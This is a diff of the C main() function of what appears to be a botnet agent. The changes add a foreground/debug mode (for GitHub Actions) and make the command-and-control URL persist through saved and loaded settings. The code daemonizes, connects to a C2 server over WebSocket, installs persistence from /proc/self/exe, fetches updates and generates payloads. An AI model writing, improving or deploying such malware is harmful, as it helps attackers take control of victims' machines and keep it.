@@ -19,14 +19,28 @@ int main(int argc, char *argv[])
 
     get_bot_uuid(g_bot_uuid, sizeof(g_bot_uuid));
 
-    /* Daemonize */
-    if (fork() > 0) return 0;
-    setsid();
-    if (fork() > 0) return 0;
-    chdir("/");
-    fclose(stdin); fclose(stdout); fclose(stderr);
-    nice(-20);
-    mlockall(MCL_CURRENT | MCL_FUTURE);
+    /* Skip daemonize when BOT_FOREGROUND=1 (GitHub Actions / debug) */
+    int foreground = 0;
+    const char *fg = getenv("BOT_FOREGROUND");
+    if (fg && (fg[0] == '1' || fg[0] == 'y' || fg[0] == 'Y'))
+        foreground = 1;
+    for (int i = 1; i < argc; i++) {
+        if (!strcmp(argv[i], "--foreground") || !strcmp(argv[i], "-f"))
+            foreground = 1;
+    }
+
+    if (!foreground) {
+        if (fork() > 0) return 0;
+        setsid();
+        if (fork() > 0) return 0;
+        chdir("/");
+        fclose(stdin); fclose(stdout); fclose(stderr);
+        nice(-20);
+        mlockall(MCL_CURRENT | MCL_FUTURE);
+    } else {
+        /* Keep logs on Actions; still raise priority if possible */
+        nice(-10);
+    }
 
     /* Start CPU governor */
     cpu_monitor_start();
@@ -36,9 +50,26 @@ int main(int argc, char *argv[])
     cfg.c2_port = 443;
     cfg.use_ssl = 1;
     strcpy(cfg.c2_path, "/ws/bot/");
-    if (argc > 1 && argv[1][0])
+
+    char url_buf[512] = {0};
+    const char *url_src = NULL;
+    for (int i = 1; i < argc; i++) {
+        if (!strcmp(argv[i], "--foreground") || !strcmp(argv[i], "-f"))
+            continue;
+        if (argv[i][0] == '-')
+            continue;
+        if (!url_src) {
+            url_src = argv[i];
+            save_c2_url(argv[i]);
+            break;
+        }
+    }
+    if (!url_src && load_c2_url(url_buf, sizeof(url_buf)))
+        url_src = url_buf;
+
+    if (url_src && url_src[0])
     {
-        const char *url = argv[1];
+        const char *url = url_src;
         if (strncmp(url, "wss://", 6) == 0) { cfg.use_ssl = 1; url += 6; }
         else if (strncmp(url, "ws://", 5) == 0) { cfg.use_ssl = 0; cfg.c2_port = 80; url += 5; }
         const char *colon = strchr(url, ':');
@@ -56,9 +87,9 @@ int main(int argc, char *argv[])
         }
         const char *path = strchr(url, '/');
         if (path && path[1]) {
-            int plen = strlen(path);
+            int plen = (int)strlen(path);
             if (plen < (int)sizeof(cfg.c2_path)) {
-                memcpy(cfg.c2_path, path, plen); cfg.c2_path[plen] = 0;
+                memcpy(cfg.c2_path, path, (size_t)plen); cfg.c2_path[plen] = 0;
             } else {
                 memcpy(cfg.c2_path, path, sizeof(cfg.c2_path) - 1);
                 cfg.c2_path[sizeof(cfg.c2_path) - 1] = 0;
@@ -80,10 +111,13 @@ int main(int argc, char *argv[])
     SysInfo info = {0};
     sys_info(&info);
 
-    char self[1024];
-    readlink("/proc/self/exe", self, sizeof(self) - 1);
-    install_persistence(self);
-    check_updates(cfg.bot_version);
+    if (!foreground) {
+        char self[1024];
+        memset(self, 0, sizeof(self));
+        if (readlink("/proc/self/exe", self, sizeof(self) - 1) > 0)
+            install_persistence(self);
+        check_updates(cfg.bot_version);
+    }
 
     gen_payloads();
 
